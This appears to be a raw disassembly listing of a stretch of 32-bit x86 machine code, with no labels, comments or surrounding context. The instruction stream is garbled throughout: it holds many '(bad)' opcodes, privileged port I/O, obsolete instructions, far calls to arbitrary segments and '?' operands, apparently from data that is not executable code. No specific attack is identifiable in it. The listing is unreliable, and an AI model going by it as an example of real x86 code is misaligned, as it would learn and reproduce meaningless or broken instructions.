  40d337:	lods   al,BYTE PTR ds:[esi]
  40d338:	mov    esp,0xff89bd25
  40d33d:	clc    
  40d33e:	(bad)  
  40d341:	enter  0x3717,0x9f
  40d345:	ss call 0xacda:0x6daf20b7
  40d34d:	mov    ebx,0xebbbc5c3
  40d352:	sti    
  40d353:	sbb    eax,0xb46b5e9f
  40d358:	adc    bl,bh
  40d35a:	push   0x41
  40d35c:	mov    ah,0x4f
  40d35e:	imul   eax,DWORD PTR [ebx-0x5f],0xe98b227a
  40d365:	jae    0x40d384
  40d367:	fadd   st,st(0)
  40d369:	xor    eax,0x6a407e84
  40d36e:	lods   eax,DWORD PTR ds:[esi]
  40d36f:	adc    al,0x93
  40d371:	in     al,dx
  40d372:	mov    ebp,0xc4f2a51b
  40d377:	and    eax,0x7da00d7
  40d37c:	sub    BYTE PTR [edi-0x7b],bh
  40d37f:	adc    eax,0x553ec588
  40d384:	and    bh,BYTE PTR [ebx-0x78]
  40d387:	sahf   
  40d388:	out    0xe8,eax
  40d38a:	mov    esi,0x2c7a203
  40d38f:	lods   eax,DWORD PTR ds:[esi]
  40d390:	popf   
  40d391:	mov    cl,0xe0
  40d393:	shl    bh,0x5f
  40d396:	cwde   
  40d397:	je     0x40d391
  40d399:	mov    eax,ds:0xec00c091
  40d39e:	mov    eax,ds:0xeb3a0cb9
  40d3a3:	pop    ss
  40d3a4:	or     BYTE PTR [eax+0x40],bh
  40d3a7:	pop    ds
  40d3a8:	mov    al,0xe8
  40d3aa:	cwde   
  40d3ab:	out    dx,al
  40d3ac:	addr16 lahf 
  40d3ae:	mov    ebp,edi
  40d3b0:	sbb    al,0xa5
  40d3b2:	sbb    BYTE PTR [esi],dh
  40d3b4:	xlat   BYTE PTR ds:[ebx]
  40d3b5:	mov    BYTE PTR [ebx+0xe666fb6],cl
  40d3bb:	xor    eax,0xb3302b3b
  40d3c0:	xchg   edx,eax
  40d3c1:	fild   QWORD PTR ds:0xd3db8488
  40d3c7:	aas    
  40d3c8:	mov    dl,0x1
  40d3ca:	arpl   WORD PTR ds:0x3bf6f037,si
  40d3d0:	push   ebp
  40d3d1:	cmc    
  40d3d2:	iret   
  40d3d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d3d4:	mov    BYTE PTR [edi+0x7ee2a21b],ch
  40d3da:	and    BYTE PTR [esi+0x7a],al
  40d3dd:	iret   
  40d3de:	xchg   ebp,eax
  40d3df:	fxch   st(4)
  40d3e1:	test   DWORD PTR [ecx-0x12],ebp
  40d3e4:	inc    edx
  40d3e5:	mov    edi,0x5de79170
  40d3ea:	push   edx
  40d3eb:	dec    edi
  40d3ec:	cmp    al,0xad
  40d3ee:	adc    eax,0x2a0bd6ff
  40d3f3:	jl     0x40d461
  40d3f5:	out    0xe,eax
  40d3f7:	sar    DWORD PTR [eax-0x1d],1
  40d3fa:	xchg   edx,eax
  40d3fb:	adc    DWORD PTR [edi-0x40],ebx
  40d3fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d3ff:	nop
  40d400:	std    
  40d401:	imul   ecx,ebp,0x6f
  40d404:	jne    0x40d3c7
  40d406:	fwait
  40d407:	test   al,0xd9
  40d409:	jp     0x40d3df
  40d40b:	pushf  
  40d40c:	in     eax,dx
  40d40d:	push   0xfffa271f
  40d412:	push   0x18
  40d414:	rcr    BYTE PTR [edi-0x51],cl
  40d417:	gs pop eax
  40d419:	mov    cl,0x18
  40d41b:	add    al,0x7c
  40d41d:	jae    0x40d46f
  40d41f:	jae    0x40d3e5
  40d421:	shl    BYTE PTR [ebp+0x49c6f450],cl
  40d427:	frstpm(287 only) 
  40d429:	push   cs
  40d42a:	(bad)  
  40d42b:	outs   dx,DWORD PTR ds:[esi]
  40d42c:	test   DWORD PTR [ecx],esp
  40d42e:	shl    BYTE PTR ds:[edi+0x32],0x40
  40d433:	mov    dh,0xa3
  40d435:	sbb    eax,ecx
  40d437:	ss jmp 0x901f6013
  40d43d:	sub    al,0x0
  40d43f:	in     eax,0xb
  40d441:	mov    bh,0xa4
  40d443:	inc    edx
  40d444:	pop    eax
  40d445:	scas   al,BYTE PTR es:[edi]
  40d446:	repnz xlat BYTE PTR ds:[ebx]
  40d448:	xchg   edx,eax
  40d449:	xor    DWORD PTR [ebx+0x2973197a],edx
  40d44f:	dec    edi
  40d450:	cmp    BYTE PTR [edi+0x56240ff4],0xd5
  40d457:	cmp    ebp,DWORD PTR [eax+0x70646cb1]
  40d45d:	xchg   edx,eax
  40d45e:	jg     0x40d424
  40d460:	and    bh,bh
  40d462:	mov    eax,ds:0xc089a288
  40d467:	cmp    dh,ch
  40d469:	pushf  
  40d46a:	das    
  40d46b:	ja     0x40d42a
  40d46d:	mov    bh,0x5c
  40d46f:	ins    DWORD PTR es:[edi],dx
  40d470:	sub    ch,dh
  40d472:	cli    
  40d473:	bound  ecx,QWORD PTR [ebp+0x4]
  40d476:	in     eax,dx
  40d477:	scas   al,BYTE PTR es:[edi]
  40d478:	jae    0x40d42e
  40d47a:	cmc    
  40d47b:	dec    esi
  40d47c:	xchg   esi,eax
  40d47d:	pop    edx
  40d47e:	cmp    al,0x42
  40d480:	cmp    dl,BYTE PTR [ecx]
  40d482:	sbb    eax,0x119735ac
  40d487:	adc    eax,edi
  40d489:	lock clc 
  40d48b:	dec    edi
  40d48c:	xchg   esi,eax
  40d48d:	xchg   esi,eax
  40d48e:	outs   dx,DWORD PTR ds:[esi]
  40d48f:	scas   eax,DWORD PTR es:[edi]
  40d490:	push   ss
  40d491:	xchg   edi,eax
  40d492:	imul   esi,DWORD PTR [ecx+0x16],0xffffffef
  40d496:	les    esi,FWORD PTR [ebx+0x4b]
  40d499:	push   ds
  40d49a:	jns    0x40d4d0
  40d49c:	mov    al,0x64
  40d49e:	dec    BYTE PTR [eax-0x1c]
  40d4a1:	sbb    ah,cl
  40d4a3:	and    BYTE PTR [edi],ch
  40d4a5:	jle    0x40d47f
  40d4a7:	js     0x40d44f
  40d4a9:	xchg   DWORD PTR [edi],edx
  40d4ab:	mov    ah,0x41
  40d4ad:	dec    eax
  40d4ae:	ret    
  40d4af:	mov    eax,ds:0xd8f4614f
  40d4b4:	stos   DWORD PTR es:[edi],eax
  40d4b5:	and    eax,0xa0a27a21
  40d4ba:	gs push ecx
  40d4bc:	in     eax,dx
  40d4bd:	xchg   esp,eax
  40d4be:	push   ds
  40d4bf:	xor    edi,DWORD PTR [edx+0x18815aa8]
  40d4c5:	jle    0x40d487
  40d4c7:	shr    BYTE PTR [eax-0x1f],cl
  40d4ca:	inc    ecx
  40d4cb:	fistp  WORD PTR [edi]
  40d4cd:	xor    edi,edi
  40d4cf:	mov    WORD PTR [esi],gs
  40d4d1:	jae    0x40d4d3
  40d4d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d4d4:	push   edi
  40d4d5:	mov    WORD PTR [edi-0x23591204],fs
  40d4db:	lods   al,BYTE PTR ds:[esi]
  40d4dc:	inc    ebx
  40d4dd:	jl     0x40d4d8
  40d4df:	repz test edx,0x76c26ce1
  40d4e6:	out    dx,eax
  40d4e7:	mov    edi,0x6af0ca9
  40d4ec:	enter  0x8799,0x3c
  40d4f0:	and    ch,BYTE PTR [eax]
  40d4f2:	add    al,0x6b
  40d4f4:	dec    ecx
  40d4f5:	mov    esp,0xd27c34cc
  40d4fa:	mov    ebp,ds
  40d4fc:	push   0x7a
  40d4fe:	data16 or cl,BYTE PTR [esi+0x2da5b3e8]
  40d505:	and    eax,0x694d394b
  40d50a:	xor    DWORD PTR [esi-0x62],0xc5511ffc
  40d511:	lds    edx,FWORD PTR [eax]
  40d513:	inc    ebx
  40d514:	jmp    FWORD PTR [ebp+0x36]
  40d517:	test   esp,0xa7cf4fd2
  40d51d:	inc    ecx
  40d51e:	fdiv   st(1),st
  40d520:	xor    esi,DWORD PTR [esp+edx*8-0x5c]
  40d524:	out    0xf9,al
  40d526:	jnp    0x40d4fa
  40d528:	rep ins BYTE PTR es:[edi],dx
  40d52a:	xor    dl,BYTE PTR [ebp-0x1c]
  40d52d:	clc    
  40d52e:	je     0x40d58f
  40d530:	xchg   ebp,eax
  40d531:	fild   WORD PTR [ebx]
  40d533:	cli    
  40d534:	cli    
  40d535:	loop   0x40d566
  40d537:	cld    
  40d538:	cmp    al,0x4e
  40d53a:	mov    ah,0x6
  40d53c:	and    BYTE PTR [ebp-0x27],0x9
  40d540:	jle    0x40d562
  40d542:	stos   DWORD PTR es:[edi],eax
  40d543:	xchg   bp,ax
  40d545:	push   edi
  40d546:	push   ebp
  40d547:	mov    ebp,0x46ae3f5b
  40d54c:	(bad)
  40d54f:	and    eax,0xb8fce02f
  40d554:	jne    0x40d5a9
  40d556:	or     dh,BYTE PTR ds:0xa1c4020
  40d55c:	inc    eax
  40d55d:	and    al,cl
  40d55f:	cmc    
  40d560:	xchg   bh,al
  40d562:	pop    edi
  40d563:	adc    al,0x61
  40d565:	in     al,0xc1
  40d567:	xchg   BYTE PTR [esp+esi*8],bh
  40d56a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d56b:	pop    ebp
  40d56c:	fld    QWORD PTR [edx+0x38]
  40d56f:	dec    esp
  40d570:	pushf  
  40d571:	xlat   BYTE PTR ds:[ebx]
  40d572:	dec    edx
  40d573:	out    0xc7,al
  40d575:	pusha  
  40d576:	cwde   
  40d577:	or     eax,DWORD PTR [edx+ebx*4+0x1e4a9df8]
  40d57e:	dec    ebx
  40d57f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d580:	sbb    eax,0xb5c19afb
  40d585:	pop    eax
  40d586:	pop    eax
  40d587:	sahf   
  40d588:	dec    esi
  40d589:	cmc    
  40d58a:	adc    eax,esi
  40d58c:	outs   dx,DWORD PTR ds:[esi]
  40d58d:	push   cs
  40d58e:	(bad)  
  40d58f:	arpl   sp,di
  40d591:	aaa    
  40d592:	jg     0x40d5eb
  40d594:	cmp    ebx,ebp
  40d596:	ss pop edx
  40d598:	outs   dx,DWORD PTR ds:[esi]
  40d599:	jp     0x40d537
  40d59b:	push   ss
  40d59c:	ss mov esp,0x92154f89
  40d5a2:	mov    ecx,0xa2ccb0eb
  40d5a7:	dec    ecx
  40d5a8:	jle    0x40d59d
  40d5aa:	mov    edi,?
  40d5ac:	fisub  WORD PTR [eax-0x5f8f1b66]
  40d5b2:	and    eax,0x1ef9a2cc
  40d5b7:	cmp    bl,cl
  40d5b9:	(bad)
  40d5bd:	mov    ds:0x5eeb275c,al
  40d5c2:	mov    bl,0x47
  40d5c4:	adc    ch,BYTE PTR ss:[edi-0x4a1b6fdd]
  40d5cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d5cc:	push   es
  40d5cd:	push   ebp
  40d5ce:	mov    fs,WORD PTR [eax]
  40d5d0:	sar    BYTE PTR [edi-0x19],1
  40d5d3:	or     bl,BYTE PTR [edx-0xe2caddf]
  40d5d9:	fidiv  WORD PTR [edi+0x56249477]
  40d5df:	xor    eax,0x2ff06683
  40d5e4:	mov    BYTE PTR ss:[esi],dh
  40d5e7:	mov    al,0xd3
  40d5e9:	enter  0xdd3f,0x3f
  40d5ed:	popf   
  40d5ee:	imul   esi,edi,0x8ec2b221
  40d5f4:	bound  esp,QWORD PTR [edi-0x5c4038dc]
  40d5fa:	fdivr  st(3),st
  40d5fc:	adc    BYTE PTR [edx],ch
  40d5fe:	xchg   BYTE PTR [edi],dl
  40d600:	mov    ch,0xe2
  40d602:	sbb    dh,BYTE PTR [ebp-0x4]
  40d605:	lds    ebp,FWORD PTR [edi-0x65506286]
  40d60b:	pop    es
  40d60c:	outs   dx,DWORD PTR ds:[esi]
  40d60d:	mov    al,0x20
  40d60f:	add    al,0x4c
  40d611:	sbb    DWORD PTR [edi-0x618fdb2a],0x42
  40d618:	fmulp  st(2),st
  40d61a:	push   ss
  40d61b:	outs   dx,BYTE PTR ds:[esi]
  40d61c:	push   edi
  40d61d:	or     BYTE PTR ds:0xbf72b726,dh
  40d623:	ins    DWORD PTR es:[edi],dx
  40d624:	xor    dl,BYTE PTR [ebp-0x3d3440ce]
  40d62a:	jne    0x40d5cc
  40d62c:	and    ebp,DWORD PTR [esi+0x68d9739]
  40d632:	cmp    edi,eax
  40d634:	out    dx,eax
  40d635:	inc    esp
  40d636:	inc    ebp
  40d637:	mov    esi,0x483354a8
  40d63c:	mov    ebx,0xa068f820
  40d641:	pusha  
  40d642:	mov    eax,ds:0x5f85ade7
  40d647:	in     eax,dx
  40d648:	and    ebp,eax
  40d64a:	xor    dl,BYTE PTR [ebp-0x2a492728]
  40d650:	adc    dl,BYTE PTR [edi+0x244cf996]
  40d656:	jecxz  0x40d670
  40d658:	leave  
  40d659:	mov    esi,0x2f7cabe
  40d65e:	ds call 0x118dc40c
  40d664:	(bad)  
  40d665:	mov    esi,0x1de8ee27
  40d66a:	jo     0x40d6cd
  40d66c:	mov    ds:0x78130fbe,al
  40d671:	aad    0xf2
  40d673:	mov    ebp,0x2656ffc4
  40d678:	dec    edi
  40d679:	pop    esp
  40d67a:	shl    DWORD PTR [edi-0x24],cl
  40d67d:	(bad)  
  40d67e:	std    
  40d67f:	bound  edx,QWORD PTR [ecx+0x352c43fc]
  40d685:	jge    0x40d678
  40d687:	popa   
  40d688:	fcomp  QWORD PTR [edx-0x58e36597]
  40d68e:	inc    cx
  40d690:	in     eax,dx
  40d691:	pop    edi
  40d692:	mov    ebp,0xa60388ed
  40d697:	mov    ah,0x72
  40d699:	in     al,dx
  40d69a:	loopne 0x40d682
  40d69c:	or     al,0xbf
  40d69e:	add    bh,ch
  40d6a0:	imul   ecx,DWORD PTR [eax+0x5e],0x34
  40d6a4:	mov    bl,0xcf
  40d6a6:	jge    0x40d641
  40d6a8:	push   0xffffff9a
  40d6aa:	icebp  
  40d6ab:	icebp  
  40d6ac:	arpl   WORD PTR [ebp-0x176ac7fc],bp
  40d6b2:	dec    ebx
  40d6b3:	push   edx
  40d6b4:	out    dx,al
  40d6b5:	mov    ebx,0x9b18046c
  40d6ba:	push   esi
  40d6bb:	in     al,dx
  40d6bc:	mov    edi,0x30d8a5de
  40d6c1:	ja     0x40d680
  40d6c3:	fisubr WORD PTR [ebx-0x57161382]
  40d6c9:	xchg   ebx,eax
  40d6ca:	outs   dx,BYTE PTR ds:[esi]
  40d6cb:	lahf   
  40d6cc:	inc    esp
  40d6cd:	xor    ah,ah
  40d6cf:	xchg   ecx,eax
  40d6d0:	jl     0x40d6b3
  40d6d2:	push   ebx
  40d6d3:	loopne 0x40d719
  40d6d5:	push   0xec01c509
  40d6da:	inc    eax
  40d6db:	jp     0x40d6a4
  40d6dd:	stos   DWORD PTR es:[edi],eax
  40d6de:	adc    DWORD PTR [ecx],esi
  40d6e0:	ins    BYTE PTR es:[edi],dx
  40d6e1:	ret    0x340
  40d6e4:	neg    BYTE PTR [edi+0x55108bf7]
  40d6ea:	pop    esp
  40d6eb:	xchg   edi,eax
  40d6ec:	push   cs
  40d6ed:	fs int3 
  40d6ef:	cmp    bl,bl
  40d6f1:	call   0x575e:0x3481ad24
  40d6f8:	and    dh,dl
  40d6fa:	xchg   DWORD PTR [edx],edx
  40d6fc:	adc    esp,DWORD PTR [edi]
  40d6fe:	jp     0x40d76c
  40d700:	aad    0x6c
  40d702:	push   0x29
  40d704:	dec    edx
  40d705:	sar    BYTE PTR [ebp-0x50],0x1d
  40d709:	rol    edx,1
  40d70b:	or     edi,ecx
  40d70d:	out    dx,eax
  40d70e:	mov    bl,0x36
  40d710:	jns    0x40d6da
  40d712:	cmp    BYTE PTR [ebx],ah
  40d714:	push   0x6f4d3254
  40d719:	cmp    al,BYTE PTR [edi+ecx*2]
  40d71c:	cld    
  40d71d:	(bad)  
  40d71e:	xor    BYTE PTR [edx],bh
  40d720:	into   
  40d721:	cmp    eax,0x6b923af9
  40d726:	and    BYTE PTR [ecx],bl
  40d728:	mov    dh,0x6e
  40d72a:	(bad)  
  40d72b:	jmp    ebx
  40d72d:	mov    ch,0xf4
  40d72f:	in     al,dx
  40d730:	mov    ds:0xb5f1d9c3,al
  40d735:	pop    ss
  40d736:	push   edi
  40d737:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d738:	cmp    DWORD PTR [esi+0x66],0x73c60c1e
  40d73f:	push   0x68
  40d741:	cmp    eax,DWORD PTR [edx]
  40d743:	in     al,dx
  40d744:	mov    WORD PTR [ebx+esi*4],ds
  40d747:	std    
  40d748:	(bad)  
  40d749:	cli    
  40d74a:	adc    al,0x24
  40d74c:	bound  esi,QWORD PTR [edx-0x4f3762f5]
  40d752:	clc    
  40d753:	rol    BYTE PTR [ebx-0x78ff766a],cl
  40d759:	push   0x7f
  40d75b:	cmp    al,0xc2
  40d75d:	xchg   ebx,eax
  40d75e:	adc    cl,bh
  40d760:	sbb    dh,dl
  40d762:	and    al,0x16
  40d764:	ss jns 0x40d726
  40d767:	or     BYTE PTR [ebp+0x4b],dh
  40d76a:	jmp    0x448e1196
  40d76f:	ds pop es
  40d771:	outs   dx,BYTE PTR ds:[esi]
  40d772:	cwde   
  40d773:	in     al,0x5
  40d775:	mov    eax,ds:0x15a1e330
  40d77a:	bound  eax,QWORD PTR [eax]
  40d77c:	test   BYTE PTR [esi+0x50],bh
  40d77f:	icebp  
  40d780:	outs   dx,BYTE PTR ds:[esi]
  40d781:	in     eax,dx
  40d782:	jmp    0x40d78e
  40d784:	fwait
  40d785:	dec    edi
  40d786:	cmp    BYTE PTR [eax-0x26d67927],0x0
  40d78d:	cmc    
  40d78e:	sbb    cl,0x70
  40d791:	clc    
  40d792:	adc    DWORD PTR [eax+0x26984e9],ecx
  40d798:	and    edx,DWORD PTR [edi-0x13]
  40d79b:	mov    edx,DWORD PTR [ebp-0x5a2760be]
  40d7a1:	dec    esi
  40d7a2:	ror    ecx,0xf6
  40d7a5:	pushf  
  40d7a6:	mov    BYTE PTR [esi],0x5b
  40d7a9:	es mov esi,edx
  40d7ac:	mov    dh,0x70
  40d7ae:	lods   al,BYTE PTR ds:[esi]
  40d7af:	pop    edi
  40d7b0:	add    DWORD PTR [ebx+0x52],ebp
  40d7b3:	gs pop eax
  40d7b5:	cmp    al,0x85
  40d7b7:	mov    dl,0xe2
  40d7b9:	adc    eax,DWORD PTR [esi+0x200e0408]
  40d7bf:	mov    al,0xa2
  40d7c1:	test   al,0xa4
  40d7c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d7c4:	pop    edx
  40d7c5:	mov    al,0x76
  40d7c7:	aam    0xd9
  40d7c9:	(bad)  
  40d7ca:	dec    ebx
  40d7cb:	mov    ebx,0x46322291
  40d7d0:	xchg   esi,eax
  40d7d1:	js     0x40d822
  40d7d3:	adc    eax,0x4b8710e
  40d7d8:	mov    bl,0x8a
  40d7da:	sub    dl,BYTE PTR [ebx+0x3c]
  40d7dd:	arpl   WORD PTR ds:0x187de50b,bp
  40d7e3:	call   0x87ebf88c
  40d7e8:	inc    esi
  40d7e9:	fidivr DWORD PTR [edx-0x7b]
  40d7ec:	mov    esp,0xc72a066e
  40d7f1:	aas    
  40d7f2:	mov    dl,0x90
  40d7f4:	std    
  40d7f5:	fmul   QWORD PTR [edi+0x33]
  40d7f8:	les    ecx,FWORD PTR [ecx]
  40d7fa:	and    dl,dl
  40d7fc:	pop    edi
  40d7fd:	dec    esp
  40d7fe:	mov    DWORD PTR cs:[ecx-0x28974428],ebp
  40d805:	pop    edi
  40d806:	mov    db2,ebp
  40d809:	cmc    
  40d80a:	jp     0x40d7a8
  40d80c:	mul    DWORD PTR [ecx-0xe]
  40d80f:	(bad)  
  40d810:	mov    DWORD PTR [ebx+ecx*8+0x65636663],esi
  40d817:	int3   
  40d818:	imul   ebx,DWORD PTR [edi],0x31ecf132
  40d81e:	jno    0x40d88b
  40d820:	out    0x1d,eax
  40d822:	out    0x97,eax
  40d824:	jno    0x40d846
  40d826:	inc    ecx
  40d827:	popf   
  40d828:	mov    dl,0x92
  40d82a:	mov    al,0xee
  40d82c:	cmp    eax,0x3ff29ef4
  40d831:	pop    esi
  40d832:	pop    ebp
  40d833:	sbb    bl,BYTE PTR [esi+eiz*4+0x5a]
  40d837:	sub    BYTE PTR [edx+0x1c343aa6],al
  40d83d:	outs   dx,BYTE PTR ds:[esi]
  40d83e:	mov    eax,0xb731b73c
  40d843:	pop    ecx
  40d844:	test   eax,0x53f88955
  40d849:	jae    0x40d84d
  40d84b:	xor    bh,BYTE PTR [edi]
  40d84d:	je     0x40d81d
  40d84f:	add    DWORD PTR [ebx-0x2c2f5b4d],edx
  40d855:	outs   dx,BYTE PTR ds:[esi]
  40d856:	mov    ds:0x7a530d6,al
  40d85b:	cmp    eax,0xfc8c7fb8
  40d860:	aas    
  40d861:	or     eax,0xecf07ccd
  40d866:	jmp    0xfbc09086
  40d86b:	push   ss
  40d86c:	stc    
  40d86d:	sub    al,0x41
  40d86f:	inc    ebp
  40d870:	enter  0x9f79,0x13
  40d874:	add    ch,BYTE PTR [ebx-0x1d]
  40d877:	dec    esi
  40d878:	inc    ebp
  40d879:	jae    0x40d8f6
  40d87b:	call   0x4f2e:0x8ad51178
  40d882:	dec    esi
  40d883:	pop    es
  40d884:	imul   ecx,DWORD PTR [eax+0x21de53ae],0xde0acee1
  40d88e:	sahf   
  40d88f:	or     bh,ah
  40d891:	loopne 0x40d89c
  40d893:	(bad)  
  40d894:	lds    eax,FWORD PTR [esp+eiz*8-0xe1cdf04]
  40d89b:	sbb    al,0x1c
  40d89d:	inc    ebp
  40d89e:	jne    0x40d8a1
  40d8a0:	lock stos BYTE PTR es:[edi],al
  40d8a2:	int3   
  40d8a3:	(bad)  
  40d8a4:	retf   0xb213
  40d8a7:	inc    eax
  40d8a8:	mov    esp,0x36955326
  40d8ad:	test   eax,0xc057816e
  40d8b2:	mov    ebx,0x62fd86e5
  40d8b7:	inc    ecx
  40d8b8:	gs pop edx
  40d8ba:	jne    0x40d83d
  40d8bc:	loop   0x40d8db
  40d8be:	scas   al,BYTE PTR es:[edi]
  40d8bf:	cmp    al,0xae
  40d8c1:	adc    al,0xcd
  40d8c3:	loopne 0x40d877
  40d8c5:	sub    DWORD PTR [ecx],ebp
  40d8c7:	aaa    
  40d8c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d8c9:	push   0x3f
  40d8cb:	dec    edi
  40d8cc:	jge    0x40d8d3
  40d8ce:	pop    ebp
  40d8cf:	nop
  40d8d0:	cld    
  40d8d1:	inc    ebp
  40d8d2:	fbstp  TBYTE PTR [ecx-0x12]
  40d8d5:	repnz pop ss
  40d8d7:	ins    DWORD PTR es:[edi],dx
  40d8d8:	xlat   BYTE PTR ds:[ebx]
  40d8d9:	cmp    DWORD PTR [edx-0x79],ebp
  40d8dc:	cmp    esi,DWORD PTR [ebx-0x6f]
  40d8df:	mov    ch,BYTE PTR [ecx]
  40d8e1:	fiadd  WORD PTR [edi-0x20]
  40d8e4:	adc    ch,bh
  40d8e6:	cmp    eax,0xe0412cd0
  40d8eb:	lea    esi,ds:[eax]
  40d8ee:	mov    al,ds:0x5f0254dd
  40d8f3:	mov    eax,ds:0x1f45ed03
  40d8f8:	xchg   ebp,eax
  40d8f9:	iret   
  40d8fa:	inc    ebp
  40d8fb:	dec    edx
  40d8fc:	outs   dx,DWORD PTR ds:[esi]
  40d8fd:	out    dx,eax
  40d8fe:	adc    cl,BYTE PTR [ebp-0x5f]
  40d901:	jge    0x40d8a7
  40d903:	add    ecx,0x3
  40d906:	std    
  40d907:	cdq    
  40d908:	pop    ebx
  40d909:	or     ebx,ebp
  40d90b:	sub    al,0xfd
  40d90d:	pop    esp
  40d90e:	sbb    dl,BYTE PTR [eax]
  40d910:	fcomp  st(1)
  40d912:	jl     0x40d957
  40d914:	je     0x40d946
  40d916:	cwde   
  40d917:	lahf   
  40d918:	fwait
  40d919:	hlt    
  40d91a:	add    ch,bh
  40d91c:	retf   
  40d91d:	mov    dl,0xeb
  40d91f:	mov    al,0x9f
  40d921:	loopne 0x40d94f
  40d923:	mov    ebp,0xcf5e4184
  40d928:	cs out dx,eax
  40d92a:	out    dx,eax
  40d92b:	std    
  40d92c:	pop    esp
  40d92d:	into   
  40d92e:	rcr    ah,1
  40d930:	outs   dx,BYTE PTR ds:[esi]
  40d931:	mov    ?,WORD PTR [esi-0x282ff018]
  40d937:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d938:	out    0xf0,eax
  40d93a:	pop    ds
  40d93b:	xor    al,dh
  40d93d:	ror    DWORD PTR [ebp+0x1a],0x10
  40d941:	or     dl,BYTE PTR [esi-0x20]
  40d944:	call   0x4af7:0x53dde599
  40d94b:	adc    al,0x3c
  40d94d:	push   0x761e5acd
  40d952:	in     eax,dx
  40d953:	pop    ss
  40d954:	pop    edi
  40d955:	add    cl,BYTE PTR ds:0xa58c1d02
  40d95b:	cld    
  40d95c:	rcr    BYTE PTR [eax-0x5e],cl
  40d95f:	push   edi
  40d960:	push   0x22
  40d962:	imul   ebp,DWORD PTR [eax-0x31],0x57
  40d966:	(bad)  
  40d967:	jmp    0x40d90b
  40d969:	cli    
  40d96a:	mov    dl,BYTE PTR [edi+eax*2]
  40d96d:	stos   DWORD PTR es:[edi],eax
  40d96e:	push   es
  40d96f:	ds pop eax
  40d971:	sbb    eax,0x97be9c48
  40d976:	mov    cl,0x6
  40d978:	xchg   DWORD PTR [ebp+0x2be7b220],edi
  40d97e:	not    cl
  40d980:	xchg   esi,eax
  40d981:	dec    edi
  40d982:	gs pop es
  40d984:	retfw  
  40d986:	jnp    0x40d9c8
  40d988:	pushf  
  40d989:	sbb    si,bp
  40d98c:	(bad)  
  40d98d:	lea    esp,[eax+0x83cc45d]
  40d993:	(bad)  
  40d994:	adc    DWORD PTR [eax],edi
  40d996:	jge    0x40d9e5
  40d998:	push   ds
  40d999:	dec    ebx
  40d99a:	cmp    esp,DWORD PTR [esi-0xe33df87]
  40d9a0:	cld    
  40d9a1:	ds push ebx
  40d9a3:	(bad)  
  40d9a4:	mov    cl,0x2e
  40d9a6:	out    0xf9,al
  40d9a8:	in     eax,dx
  40d9a9:	pop    ecx
  40d9aa:	push   ebp
  40d9ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d9ac:	scas   eax,DWORD PTR es:[edi]
  40d9ad:	jno    0x40d986
  40d9af:	sub    eax,0xc1c6762d
  40d9b4:	shl    DWORD PTR [ecx-0x24],cl
  40d9b7:	(bad)  
  40d9b8:	sub    BYTE PTR [esi+0x27],bh
  40d9bb:	and    al,0xe9
  40d9bd:	push   0xfdd771f5
  40d9c2:	xor    BYTE PTR ds:[ebx-0x61],0xa2
  40d9c7:	cmp    dh,BYTE PTR [esi+0x7]
  40d9ca:	push   eax
  40d9cb:	cs jnp 0x40da32
  40d9ce:	lea    ecx,[edi-0x35]
  40d9d1:	retf   
  40d9d2:	cmp    DWORD PTR [ebx],edi
  40d9d4:	retf   
  40d9d5:	xor    BYTE PTR [esi-0x4a],cl
  40d9d8:	je     0x40da3d
  40d9da:	sub    bh,dh
  40d9dc:	fild   DWORD PTR [eax+0x52]
  40d9df:	jmp    0x5adca0d2
  40d9e4:	(bad)  
  40d9e5:	(bad)  
  40d9e6:	retf   
  40d9e7:	aaa    
  40d9e8:	mov    ch,ah
  40d9ea:	cmp    ecx,DWORD PTR [eax+0x15]
  40d9ed:	mov    edx,ebx
  40d9ef:	lods   eax,DWORD PTR ds:[esi]
  40d9f0:	lahf   
  40d9f1:	sub    edx,DWORD PTR [esi]
  40d9f3:	shl    DWORD PTR [ebx+0xb],1
  40d9f6:	(bad)  
  40d9f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d9f9:	add    eax,0x93ad0e17
  40d9fe:	pop    es
  40d9ff:	fadd   st,st(7)
  40da01:	pop    esi
  40da02:	lods   eax,DWORD PTR ds:[esi]
  40da03:	mov    dl,0x1f
  40da05:	lock mov ebp,0x1a358253
  40da0b:	adc    al,0x89
  40da0d:	lock jmp 0xbc01:0xf3602b0d
  40da15:	fwait
  40da16:	rcr    esi,1
  40da18:	popa   
  40da19:	repnz fistp DWORD PTR [ecx+0x2073c031]
  40da20:	hlt    
  40da21:	ins    DWORD PTR es:[edi],dx
  40da22:	faddp  st(6),st
  40da24:	(bad)  
  40da25:	mov    ss,WORD PTR [ecx+0x2f]
  40da28:	pop    ebp
  40da29:	addr16 cs ret 0xf26a
  40da2e:	sub    ebp,DWORD PTR [esi+eiz*2-0x71]
  40da32:	leave  
  40da33:	and    esp,DWORD PTR [ebp+0x55]
  40da36:	icebp  
  40da37:	sub    BYTE PTR [ecx],bh
  40da39:	cld    
  40da3a:	xchg   DWORD PTR es:[ecx-0x2d5cba23],ebx
  40da41:	or     bh,BYTE PTR [esi-0x72]
  40da44:	xor    BYTE PTR [edi-0x6e9a5d8c],bh
  40da4a:	ins    BYTE PTR es:[edi],dx
  40da4b:	pop    esi
  40da4c:	cli    
  40da4d:	(bad)  
  40da4e:	sbb    DWORD PTR [ebx],edi
  40da50:	(bad)  [edi+eiz*4+0x7ed62497]
  40da57:	rol    esi,cl
  40da59:	push   edi
  40da5a:	retf   
  40da5b:	mov    edx,0x462173bb
  40da60:	das    
  40da61:	into   
  40da62:	sub    ecx,DWORD PTR [edx]
  40da64:	jl     0x40d9ee
  40da66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40da67:	dec    ebp
  40da68:	int    0x61
  40da6a:	cmc    
  40da6b:	loope  0x40daac
  40da6d:	or     DWORD PTR [edi+0x62],esp
  40da70:	sub    esi,edx
  40da72:	xor    ebp,0xdad8b552
  40da78:	aaa    
  40da79:	ins    DWORD PTR es:[edi],dx
